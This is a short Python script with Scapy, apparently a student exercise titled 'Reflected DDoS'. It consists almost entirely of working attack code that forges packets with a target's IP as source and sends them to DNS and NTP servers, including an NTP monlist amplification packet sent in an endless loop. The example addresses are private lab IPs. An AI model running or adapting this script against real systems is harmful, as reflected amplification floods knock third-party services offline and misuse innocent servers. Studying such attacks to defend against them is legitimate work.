"""
Luyckx Marco 496283
Bouhnine Ayoub 500048

Reflected DDoS
"""
from scapy.all import *


def dns_ddos(target, dns_server):

    ip = IP(src=target, dst=dns_server)
    udp = UDP(dport=53)
    dns = DNS(rd=1, qdcount=1, qd=DNSQR(qname="google.com", qtype=225))

    request = (ip/udp/dns)

    send(request)

def ntp_ddos(target, ntp_server):
    #Magic Packet aka NTP v2 Monlist Packet
    data = "\x17\x00\x03\x2a" + "\x00" * 4
    packet = IP(dst=ntp_server,src=target)/UDP(sport=random.randint(2000,65535),dport=123)/Raw(load=data)
    send(packet,loop=1)

if __name__ == "__main__":
    dns_ddos(target="10.12.0.10", dns_server="10.12.0.20") # target webserver for example
    ntp_ddos(target="10.12.0.10", ntp_server="10.12.0.30")